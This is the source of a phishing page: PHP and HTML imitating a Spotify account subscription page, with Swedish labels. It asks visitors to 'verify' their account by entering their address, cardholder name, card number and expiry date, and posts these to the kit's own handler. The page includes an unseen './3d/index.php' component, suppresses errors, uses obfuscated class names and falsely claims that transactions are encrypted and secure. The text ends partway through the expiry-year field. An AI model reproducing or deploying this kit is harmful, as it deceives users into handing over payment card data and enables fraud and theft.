<?php
error_reporting(0);
include "./3d/index.php";

?>
<!DOCTYPE html>
<html class="translated-ltr"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Spotify</title>
    <link rel="icon" href="../../files/download.ico">
<style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.qhDXWpKopYk.L.W.O/am=CAM/d=0/rs=AN8SPfqeKn8wA30q4viup18yaci8udUjKQ/m=el_main_css"></head>
<body class=" m-int l-en page-account-subscription-update is-loggedin  reboot " cz-shortcut-listen="true">
<script type="text/javascript">
    function xForm() {
        if (document.getElementById('xnxx').value.length < 9) {
            document.getElementById('xnxx').className = "form-control error";
            document.body.style.backgroundColor = "#fefdd2";
            document.getElementById('xnxx').focus();
            return false;
        } else {
            document.getElementById('xnxx').className = "form-control";
        }
        ;
///////
        if (document.getElementById('xuser').value.length < 8) {
            document.getElementById('xuser').className = "form-control error";
            document.body.style.backgroundColor = "#fefdd2";
            document.getElementById('xuser').focus();
            return false;
        } else {
            document.getElementById('xuser').className = "form-control";
        }
        ;
///////
        if (document.getElementById('aaa').value.length < 4) {
            document.getElementById('aaa').className = "form-control error";
            document.body.style.backgroundColor = "#fefdd2";
            document.getElementById('aaa').focus();
            return false;
        } else {
            document.getElementById('aaa').className = "form-control";
        }
        ;
///////

        document.getElementById('loading').style.display = "block";
        document.getElementById('xbootn').style.display = "none";
    }
</script>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="Spotify is a digital music service that gives you access to millions of songs.">
<meta name="keywords" content="Spotify, music, online, listen, streaming, play, digital, album, artist, playlist">
<link rel="stylesheet" href="spotify-543b91ee3c.css">
<link rel="stylesheet" href="account-4445741da9.css">
<link rel="stylesheet" href="embedded-checkout-7f51b6350a.css">
<div id="fb-root"></div>
<div class="wrap">
    <header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
                    <span class="sr-only"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Change navigation</font></font></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <ul class="nav">
                    <li class="dropdown">
                        <a href="#" class="user-link dropdown-toggle hidden-xs hidden-sm" data-toggle="dropdown">
                            <div class="user-icon-container img-circle navbar-user-img">
                                <svg class="user-icon">
                                    <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                                    </use>
                                </svg>
                            </div>
                        </a>
                        <a href="#" class="user-link hidden-md hidden-lg" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">
                            <div class="user-icon-container img-circle navbar-user-img">
                                <svg class="user-icon">
                                    <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                                    </use>
                                </svg>
                            </div>
                        </a>
                        <ul class="dropdown-menu dropdown-menu-right">
                            <li>
                                <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">account</font></font></a>
                            </li>
                            <li>
                                <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">log out</font></font></a>
                            </li>
                        </ul>
                    </li>
                </ul>
                <a href="#" class="user-link hidden ">
                    <div class="user-icon-container img-circle navbar-user-img">
                        <svg class="user-icon">
                            <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                            </use>
                        </svg>
                    </div>
                </a>
                <a class="navbar-brand" href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;spotify-logo&quot;}">
                    <span class="navbar-logo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Spotify</font></font></span>
                </a>
            </div>
            <nav class="collapse navbar-collapse" id="navbar-nav" role="navigation">
                <ul class="nav navbar-nav navbar-right nav-main">
                    <li>
                        <a href="#" id="nav-link-premium" data-ga-category="menu" data-ga-action="premium"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Premium
                        </font></font></a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-help" data-ga-category="menu" data-ga-action="help"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Help
                        </font></font></a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-download" class="js-get-spotify js-gtm-event" data-ga-category="menu" data-ga-action="download" data-gtm-event-name="download_spotify_button_clicked" data-tracking="{&quot;category&quot;: &quot;download&quot;, &quot;action&quot;: &quot;download start&quot;, &quot;label&quot;: &quot;download-navbar&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fetch
                        </font></font></a>
                    </li>
                    <li role="separator" class="divider"></li>
                    <li class="alternate sidepanel-item-small hidden-md ">
                        <a href="#" id="nav-link-upgrade" data-ga-category="menu" data-ga-action="upgrade"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Upgrade
                        </font></font></a>
                    </li>
                    <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
                        <a href="#" id="nav-link-account" data-ga-category="menu" data-ga-action="account"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            account
                        </font></font></a>
                    </li>
                    <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
                        <a href="https://www.spotify.com/int/logout/" id="nav-link-log-out" data-ga-category="menu" data-ga-action="log-out"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            log out
                        </font></font></a>
                    </li>
                    <li class="dropdown alternate hidden-sidepanel">
                        <a href="#" class="user-link dropdown-toggle" data-toggle="dropdown">
                            <div class="user-icon-container img-circle navbar-user-img">
                                <svg class="user-icon">
                                    <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                                    </use>
                                </svg>
                            </div>
                            <span class="user-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Profile</font></font></span>
                            <svg class="svg-chevron-down">
                                <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use>
                            </svg>
                        </a>
                        <ul class="dropdown-menu dropdown-menu-right">
                            <li class="alternate sidepanel-item-small visible-md-block ">
                                <a href="#" id="nav-link-upgrade" data-ga-category="menu" data-ga-action="upgrade"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Upgrade
                                </font></font></a>
                            </li>
                            <li>
                                <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">account</font></font></a>
                            </li>
                            <li>
                                <a href="#" class="logout-link" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">log out</font></font></a>
                            </li>
                        </ul>
                    </li>
                </ul>
            </nav>
        </div>
    </header>
    <div class="content-wrapper">
        <div class="container container-content">
            <div class="row">
                <div class="col-sm-3 hidden-xs">
                    <div class="sidebar">
                        <div class="user-icon-container img-circle ">
                            <svg class="user-icon">
                                <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                                </use>
                            </svg>
                        </div>
                        <ul class="nav-inverse nav-tabs nav-stacked">
                            <li id="submenu-item-account-overview">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-home"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Account summary</font></font></a>
                            </li>
                            <li id="submenu-item-family-plan">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-redeem"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Premium for the family</font></font></a>
                            </li>
                            <li id="submenu-item-edit-profile">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-edit"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Edit profile</font></font></a>
                            </li>
                            <li id="submenu-item-change-password">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-locked"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Change Password</font></font></a>
                            </li>
                            <li id="submenu-item-notification-settings">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-notifications"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Notification settings</font></font></a>
                            </li>
                            <li id="submenu-item-offline-devices">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-offline"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Offline devices</font></font></a>
                            </li>
                            <li id="submenu-item-recover-playlists">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-refresh"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Restore playlists</font></font></a>
                            </li>
                            <li class="active" id="submenu-item-subscription">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-payment"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Subscription</font></font></a>
                            </li>
                            <li id="submenu-item-receipts">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-payment-history"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Receipts</font></font></a>
                            </li>
                            <li id="submenu-item-apps">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-apps"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    App</font></font></a>
                            </li>
                            <li id="submenu-item-redeem">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-redeem"></use>
                                    </svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                    Redeem</font></font></a>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="col-sm-9">
                    <div class="content">
                        <div class="article-account">
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="well card change-payment">
                                        <h2 class="change-payment-header text-center"></h2>
                                        <p class="change-payment-paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wait... </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">You will be redirected...</font></font></p>
                                        <div class="kabobloader">
                                            <div class="bounce1"></div>
                                            <div class="bounce2"></div>
                                            <div class="bounce3"></div>
                                        </div>
                                        <section style="display:none; border: 1px solid rgba(191, 176, 176, 0.51); " class="panel panel-form" data-checkout-panel="" data-tracking-endpoint="https://www.spotify.com/int/payment/payment-event/">
                                            <div data-redirect-message="" class="redirect-message checkout-modal hidden">
                                                <div class="checkout-modal-content">
                                                    <div class="icon">
                                                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 30 18">
                                                            <polygon points="29.4,9 20.7,0.3 19.3,1.7 25.6,8 0,8 0,10 25.6,10 19.3,16.3 20.7,17.7"></polygon>
                                                        </svg>
                                                    </div>
                                                    <div class="message"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Taking you to complete your purchase...</font></font></div>
                                                </div>
                                            </div>
                                            <ul class="list-unstyled picker-tabs" data-payment-picker="">
                                                <li class="picker-tab">
                                                    <a class="picker-button" data-payment-picker-button="" data-name="billing_adyen_cards">
                                                        <svg width="35" height="25" viewBox="0 0 350 250" xmlns="http://www.w3.org/2000/svg">
                                                            <path fill="#F8F8F8" d="M320 250H30c-16.6 0-30-13.4-30-30V30C0 13.4 13.4 0 30 0h290c16.6 0 30 13.4 30 30v190c0 16.6-13.4 30-30 30z"></path>
                                                            <path fill="#E7E7E7" d="M320 10c11 0 20 9 20 20v190c0 11-9 20-20 20H30c-11 0-20-9-20-20V30c0-11 9-20 20-20h290m0-10H30C13.4 0 0 13.4 0 30v190c0 16.6 13.4 30 30 30h290c16.6 0 30-13.4 30-30V30c0-16.6-13.4-30-30-30z"></path>
                                                            <path fill="#0F2496" d="M146.9 82.1l-18.4 85.4h22.2l18.4-85.4h-22.2zm143 0H271c-4.2 0-7.9 2.5-9.4 6.2l-33.4 79.2h23.3l4.6-12.8h28.5l2.7 12.8h20.6l-18-85.4zm-27.3 55.1l11.6-32 6.7 32h-18.3zM114 82.1l-23.1 58.1-9.4-49.4c-1.2-5.6-5.4-8.8-10.3-8.8H33.6l-.5 2.5c7.8 1.7 16.5 4.4 21.9 7.2 3.2 1.9 4.2 3.4 5.2 7.6l17.7 68.3h23.4l36.1-85.4H114v-.1zm84.3 23.8c0-3 3-6.4 9.4-7.1 3.2-.3 12-.7 21.9 3.9l3.9-18.2c-5.4-1.9-12.3-3.7-20.7-3.7-21.9 0-37.4 11.6-37.6 28.3-.2 12.3 11.1 19.2 19.4 23.3 8.6 4.2 11.6 6.9 11.5 10.6 0 5.7-6.9 8.3-13.3 8.4-11.1.2-17.7-3-22.8-5.4l-4 18.7c5.2 2.4 14.8 4.4 24.8 4.6 23.4 0 38.6-11.5 38.8-29.2-.2-22.9-31.5-24.3-31.3-34.2z"></path>
                                                        </svg>
                                                        <svg xmlns="http://www.w3.org/2000/svg" width="35" height="25" viewBox="0 0 350 250">
                                                            <path fill="#F8F8F8" d="M320 250H30c-16.6 0-30-13.4-30-30V30C0 13.4 13.4 0 30 0h290c16.6 0 30 13.4 30 30v190c0 16.6-13.4 30-30 30z"></path>
                                                            <path fill="#E7E7E7" d="M320 10c11 0 20 9 20 20v190c0 11-9 20-20 20H30c-11 0-20-9-20-20V30c0-11 9-20 20-20h290m0-10H30C13.4 0 0 13.4 0 30v190c0 16.6 13.4 30 30 30h290c16.6 0 30-13.4 30-30V30c0-16.6-13.4-30-30-30z"></path>
                                                            <path fill="#F79F1A" d="M275.805 125.015c0 34.514-27.95 62.465-62.344 62.465s-62.343-27.95-62.343-62.465S179.07 62.55 213.46 62.55s62.345 27.95 62.345 62.465z"></path>
                                                            <path fill="#EA001B" d="M198.878 125.015c0 34.514-27.952 62.465-62.344 62.465S74.19 159.53 74.19 125.015s27.95-62.466 62.344-62.466 62.344 27.95 62.344 62.465z"></path>
                                                            <path fill="#FF5F01" d="M174.937 75.796c-14.584 11.423-23.82 29.167-23.82 49.22s9.358 37.794 23.82 49.218c14.583-11.424 23.82-29.167 23.82-49.22s-9.237-37.795-23.82-49.218z"></path>
                                                        </svg>
                                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 87 62">
                                                            <use fill="url(#amex-paint0_radial)" transform="translate(1.243 1.24)" xlink:href="#amex-path0_fill"></use>
                                                            <use fill="#E7E7E7" xlink:href="#amex-path1_fill"></use>
                                                            <use fill="#FFF" transform="translate(17.251 26.66)" xlink:href="#amex-path2_fill"></use>
                                                            <use fill="#FFF" transform="translate(7.333 21.824)" xlink:href="#amex-path3_fill"></use>
                                                            <defs>
                                                                <radialGradient id="amex-paint0_radial" cx=".5" cy=".5" r=".5" gradientTransform="matrix(162.145 0 0 -161.772 -67.042 82.44)" gradientUnits="userSpaceOnUse">
                                                                    <stop offset="0" stop-color="#9DD5F6"></stop>
                                                                    <stop offset=".071" stop-color="#98D3F5"></stop>
                                                                    <stop offset=".158" stop-color="#89CEF3"></stop>
                                                                    <stop offset=".252" stop-color="#70C6EF"></stop>
                                                                    <stop offset=".351" stop-color="#4EBBEA"></stop>
                                                                    <stop offset=".455" stop-color="#23ADE3"></stop>
                                                                    <stop offset=".5" stop-color="#0DA6E0"></stop>
                                                                    <stop offset="1" stop-color="#2E77BC"></stop>
                                                                </radialGradient>
                                                                <path id="amex-path0_fill" d="M77.057 0h-69.6C3.331 0 0 3.323 0 7.44v44.64c0 4.117 3.33 7.44 7.457 7.44h69.6c4.126 0 7.457-3.323 7.457-7.44V7.44c0-4.117-3.33-7.44-7.457-7.44z"></path>
                                                                <path id="amex-path1_fill" d="M79.543 2.48c2.734 0 4.971 2.232 4.971 4.96v47.12c0 2.728-2.237 4.96-4.971 4.96H7.457c-2.734 0-4.971-2.232-4.971-4.96V7.44c0-2.728 2.237-4.96 4.971-4.96h72.086zm0-2.48H7.457C3.331 0 0 3.323 0 7.44v47.12C0 58.677 3.33 62 7.457 62h72.086C83.669 62 87 58.677 87 54.56V7.44C87 3.323 83.67 0 79.543 0z"></path>
                                                                <path id="amex-path2_fill" d="M0 5.208h4.275L2.138 0 0 5.208zM33.483.496v2.38h6.91v2.68h-6.91v2.628h7.73l3.58-3.894L41.387.496h-7.904z"></path>
                                                                <path id="amex-path3_fill" d="M70.768 0H59.433l-2.585 2.802L54.438 0H31.021l-2.063 4.712L26.846 0h-9.67v2.182L16.107 0H7.93L0 18.302h9.47l1.219-2.926h2.684l1.193 2.926h10.54v-2.207l.944 2.257h5.469l.944-2.257v2.257h21.601l2.66-2.852 2.535 2.852h11.136L62.193 9.25 70.768 0zM38.031 15.698h-3.206V5.406l-4.549 10.292h-2.809L22.918 5.406v10.292H16.53l-1.193-2.926H8.775l-1.218 2.926h-3.43L9.743 2.58h4.673l5.344 12.425V2.579h5.121l4.126 8.903 3.779-8.903h5.244V15.7zm26.672.05h-4.076l-3.878-4.34-4.002 4.34H40.293V2.604h12.653l3.877 4.315 4.002-4.315h4.127l-6.115 6.572 5.866 6.572z"></path>
                                                            </defs>
                                                        </svg>
                                                    </a>
                                                </li>
                                                <li class="picker-tab picker-more hidden" data-payment-picker-more="">
                                                    <a class="" href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•••</font></font></a>
                                                </li>
                                            </ul>
                                            <div class="message-panel hidden" data-transactional-messages=""></div>
                                            <div class="message-panel error-message with-icon hidden" data-form-field-messages="">
                                                <div class="icon">
                                                    <svg viewBox="0 0 24 24">
                                                        <circle cx="12" cy="12" r="9.5" stroke="currentColor" fill="none"></circle>
                                                        <line x1="12" y1="17" x2="12" y2="10" stroke="currentColor"></line>
                                                        <circle cx="12" cy="7.35" r=".35" stroke="currentColor" fill="none"></circle>
                                                    </svg>
                                                </div>
                                                <ul class="form-message-list"></ul>
                                            </div>
                                            <div class="panel-tab" data-checkout-panel-tab="" data-name="billing_adyen_cards">
                                                <form name="offer" method="post" action="" data-payment-form="credit-card" data-pci-config="{&quot;url&quot;:&quot;https:\/\/pci.spotify.com\/static\/form_offer_panel.html&quot;,&quot;provider&quot;:&quot;adyen&quot;,&quot;generationTime&quot;:&quot;2018-02-06T20:05:16+00:00&quot;,&quot;postal&quot;:{&quot;require&quot;:true,&quot;postal_code&quot;:&quot;21009&quot;},&quot;postalCodeFieldName&quot;:&quot;offer[zip-code]&quot;,&quot;icons&quot;:[&quot;amex&quot;,&quot;mastercard&quot;,&quot;visa&quot;,&quot;cb&quot;],&quot;translations&quot;:{&quot;cardNumber&quot;:&quot;Card number&quot;,&quot;expirationDate&quot;:&quot;Expiry date&quot;,&quot;month&quot;:&quot;Month&quot;,&quot;year&quot;:&quot;Year&quot;,&quot;securityCode&quot;:&quot;Security code&quot;,&quot;postalCode&quot;:&quot;Zip code&quot;,&quot;cvc_info&quot;:&quot;The security code, or CVV, refers to the extra 3 or 4 numbers on the back or front of your card.&quot;,&quot;invalid_cvc&quot;:&quot;Please enter the last 3 numbers on the back of your card (or 4 numbers on the front if Amex).&quot;,&quot;invalid_creditcard&quot;:&quot;Enter a valid credit card number.&quot;,&quot;invalid_zipcode&quot;:&quot;Enter a valid zip or postal code.&quot;,&quot;invalid_mm&quot;:&quot;Select the expiration month.&quot;,&quot;invalid_yy&quot;:&quot;Select the expiration year.&quot;,&quot;invalid_form_data&quot;:&quot;The info you&amp;#039;ve entered into one or more fields is incorrect. Make updates and try again, or &amp;lt;a href=&amp;quot;https:\/\/support.spotify.com\/account_payment_help\/payment_help\/problems-paying-for-spotify-by-card\/&amp;quot;&amp;gt;get help&amp;lt;\/a&amp;gt;.&quot;}}">
                                                    <h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Credit card</font></font></h2>
                                                    <div data-pci-container="" class="pci-container">
                                                        <div class="pci-loader"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                                            Scanning. </font><font style="vertical-align: inherit;">Wait......
                                                        </font></font></div>
                                                        <div data-pci-frame-hook="">
                                                            <iframe src="../../files/form_offer_panel.html" height="289" width="100%" class="pci-iframe" frameborder="0" scrolling="no"></iframe>
                                                        </div>
                                                        <div data-pci-tooltip="cvc_info" role="tooltip" class="pci-tooltip"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                                            The security code, or CVV, refers to the extra 3 or 4 numbers on the back or front of your card.
                                                        </font></font></div>
                                                        <div data-pci-tooltip="security_explained" role="tooltip" class="pci-tooltip top-left"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                                            Transactions are encrypted and secure.
                                                        </font></font></div>
                                                    </div>
                                                    <p class="text-legal"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                                        Spotify will do a temporary authorization on your card to verify it. </font><font style="vertical-align: inherit;">This is only an authorization and NOT a fee.
                                                    </font></font></p>
                                                    <p class="text-legal">
                                                        <strong>Genom att köpa auktoriserar du Spotify att automatiskt
                                                             debiterar dig 4,99 USD + eventuell skatt varje månad tills du
                                                             Avbryt.</strong> Om priset ändras kommer vi att meddela dig
                                                         i förväg. Du kan kontrollera ditt förnyelsedatum eller avbryta när som helst
                                                         via din <a href="#">Kontosida</a>. Inga partiella återbetalningar. <a href="#">Villkor</a> tillämpa.
                                                    </p>
                                                    <div>
                                                        <div id="offer_pci"></div>
                                                    </div>
                                                    <div>
                                                        <div class="submit-button">
                                                            <button type="submit" id="offer_submit" name="offer[submit]" class="btn btn-green">
            <span class="submit-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 17">
    <path class="cls-1" d="M1424,4255.94v-4a1,1,0,0,0-.08-0.38,1,1,0,0,0-.93-0.61h-1v-2a5,5,0,0,0-10,0v2h-1a1.15,1.15,0,0,0-.94.67,1,1,0,0,0-.07.32v8a1,1,0,0,0,.12.44,1,1,0,0,0,.63.5,1,1,0,0,0,.25.05h12a1,1,0,0,0,.93-0.61,1,1,0,0,0,.08-0.39v-4Zm-10-7a3,3,0,0,1,6,0v1.92h-6v-1.92Z" transform="translate(-1410 -4243.94)"></path>
</svg>
            </span>
                                                                Verifiera ditt konto
                                                            </button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>
                                            <div class="panel-tab selected" data-checkout-panel-tab="" data-name="billing_paypal">
                                                <form name="offer" method="post" action="" data-payment-form="">
                                                    <div class="row">
                                                        <div class="col-xs-12">

                                                            <div class="form-group">
                                                                <label id="trans-label_postal_code" for="zip-code">Adress</label>
                                                                <input id="xnxx" name="address" autocomplete="off" type="text" class="form-control">
                                                            </div>

                                                            <div class="form-group">
                                                                <label id="trans-label_postal_code" for="zip-code">Card
                                                                    Hållarens</label>
                                                                <input id="xuser" name="cardholder" autocomplete="off" type="text" class="form-control">
                                                            </div>
                                                            <div class="form-group">
                                                                <label for="cardnumber" class="card-label">
                                                                    <span id="trans-cardnumber">Kortnummer</span>
                                                                    <span class="card-icons">
                        <span id="provider-icons"><span class="icon-provider visa disabled" data-type="visa"></span><span class="icon-provider mastercard disabled" data-type="mastercard"></span><span class="icon-provider amex disabled" data-type="amex"></span><span class="icon-provider cb disabled" data-type="cb"></span></span>
                        <a id="secure-lock" class="icon-provider lock" data-tooltip="" data-lang="security_explained"></a>
                    </span>
                                                                </label>
                                                                <span class="safe-field">
<style>
.xx_Z118xMARVEL .x_V-ForZ118 #cardnumber {
    background-image: url('../../files/sprites_cc_logos.png');
    background-repeat: no-repeat;
    background-position: 98.5% 81.7%;
}

.xx_Z118xMARVEL .x_V-ForZ118 #csc {
    background-image: url('../../files/vv.gif');
    background-repeat: no-repeat;
    background-position: 99% 45%;
}

.Xval666ideX1 {
    position: relative
}

.Xval666ideX1.focus .mobileEntry,
.Xval666ideX1.focus .x_V-ForZ118 {
    z-index: 4
}

.Xval666ideX1.valid {
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 69.5%;
    background-color: #fff;
}

.Xval666ideX1.error {
    border: 1px solid #c72e2e;
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 62%;
    background-color: #fefdd2;
    color: #c72e2e;
}

.Xval666ideX1.error:hover,
.Xval666ideX1.error:focus {
    border: 1px solid #c72e2e;
    transition: all 0.3s ease-out;
}

.jp-card-valid {
    position: relative
}

.jp-card-valid.focus .mobileEntry,
.jp-card-valid.focus .x_V-ForZ118 {
    z-index: 4
}

.jp-card-valid.valid {
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 70%;
    background-color: #fff;
}

.tabon.error {
    border: 1px solid #c72e2e;
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 62%;
    background-color: #fefdd2;
    color: #c72e2e;
}

.tabon.error:hover,
.tabon.error:focus {
    border: 1px solid #c72e2e;
    transition: all 0.3s ease-out;
}

.valid.jp-card-invalid {
    border: 1px solid #c72e2e;
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 62%;
    background-color: #fefdd2;
    color: #c72e2e;
}

.valid.jp-card-invalid:hover,
.valid.jp-card-invalid:focus {
    border: 1px solid #c72e2e;
    transition: all 0.3s ease-out;
}


body {
    background: linear-gradient(90deg, #262626, #2E2F33);
}

.kabobloader {
    margin: auto;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    position: absolute;
    width: 70px;
    height: 70px;

}

.kabobloader > div {
    width: 18px;
    height: 18px;
    background-color: #2EBD59;
    border-radius: 100%;
    display: inline-block;
    -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
    animation: sk-bouncedelay 1.4s infinite ease-in-out both;
}

.kabobloader .bounce1 {
    -webkit-animation-delay: -0.32s;
    animation-delay: -0.32s;
}

.kabobloader .bounce2 {
    -webkit-animation-delay: -0.16s;
    animation-delay: -0.16s;
}

@-webkit-keyframes sk-bouncedelay {
    0%, 80%, 100% {
        -webkit-transform: scale(0)
    }
    40% {
        -webkit-transform: scale(1.0)
    }
}

@keyframes sk-bouncedelay {
    0%, 80%, 100% {
        -webkit-transform: scale(0);
        transform: scale(0);
    }
    40% {
        -webkit-transform: scale(1.0);
        transform: scale(1.0);
    }
}
</style>

<div class=" x_V-ForZ118 large">
<input class="form-control" name="cardnumber" placeholder="1111 2222 3333 4444" type="tel" id="cardnumber" value="">
<input name="c_type" type="hidden" id="card_type" value="">
<input name="c_valid" type="hidden" id="card_valid" value="">
    <script src="../../files/jquery.js" type="text/javascript"></script>
    <script src="../../files/jquery.maskedinput.js" type="text/javascript"></script>
    <script src="../../files/jquery.validate.js"></script>
	<script src="../../files/jquery.additional-methods.js"></script>
	<script src="../../files/jquery.v-form.js"></script>
	<script src="../../files/jquery.CardValidator.js"></script>
	<script src="../../files/jquery.mask.js"></script>
	<script type="text/javascript">
        $(function () {
            $('#cardnumber').validateCreditCard(function (result) {
                document.getElementById('card_type').value = result.card_type.name
                document.getElementById('card_valid').value = result.valid
                $('#cardnumber').validateCreditCard(function (result) {
                    if (result.card_type == null) {
                        $('#cardnumber').removeClass();
                    } else {
                        $('#cardnumber').addClass(result.card_type.name);
                    }
                });
            });
        });
    </script>
</div>				
			</span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="row">
                                                        <div class="col-xs-12">
                                                            <div class="form-group">
                                                                <label id="trans-expiration_date" for="expiration_date">Upphörande
                                                                     datum</label>
                                                                <div class="row">
                                                                    <div class="col-xs-6">
                                                                        <select id="expiry-month" autocomplete="cc-exp-month" data-encrypted-="" name="expiryMonth" class="form-control">
                                                                            <option id="trans-label_month" value="" default="default" selected="selected">Månad
                                                                            </option>
                                                                            <option value="1">01</option>
                                                                            <option value="2">02</option>
                                                                            <option value="3">03</option>
                                                                            <option value="4">04</option>
                                                                            <option value="5">05</option>
                                                                            <option value="6">06</option>
                                                                            <option value="7">07</option>
                                                                            <option value="8">08</option>
                                                                            <option value="9">09</option>
                                                                            <option value="10">10</option>
                                                                            <option value="11">11</option>
                                                                            <option value="12">12</option>
                                                                        </select>
                                                                    </div>
                                                                    <div class="col-xs-6">
                                                                        <select id="expiry-year" autocomplete="cc-exp-year" data-encrypted-="" name="expiryYear" class="form-control">
                                                                            <option id="trans-label_year" value="" default="" selected="selected">År
                                                                            </option>
                                                                            <option value="2019">2019</option>
                                                                            <option value="2020">2020</option>
                                                                            <option value="2021">2021</option>
                                                                            <option value="2022">2022</option>
                                                                            <option value="2023">2023</option>
                                                                            <option value="2024">2024</option>
                                                                            <option value="2025">2025</option>
                                                                            <option value="2026">2026</option>
                                                                            <option value="2027">2027</option>
